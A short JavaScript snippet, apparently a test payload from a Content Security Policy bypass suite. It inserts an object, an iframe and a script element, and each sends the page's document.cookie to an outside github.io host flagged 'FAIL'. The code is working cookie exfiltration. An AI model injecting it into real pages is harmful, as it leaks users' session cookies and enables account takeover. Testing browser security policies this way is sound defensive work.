(function(){

		var o = document.createElement("object");
		o.data = `https://ibraheemmoosa137.github.io/bypass-object-src.html?id=FAIL&cookie=${document.cookie}&rand=${performance.now()}`;
		document.body.appendChild(o);

		var i = document.createElement("iframe");
		i.src = `https://ibraheemmoosa137.github.io/bypass-child-src.html?id=FAIL&cookie=${document.cookie}&rand=${performance.now()}`;
		document.body.appendChild(i);

		var s = document.createElement("script");
		s.src = `https://ibraheemmoosa137.github.io/bypass-script-src.js?id=FAIL&cookie=${document.cookie}&rand=${performance.now()}`;
		document.body.appendChild(s);

}())
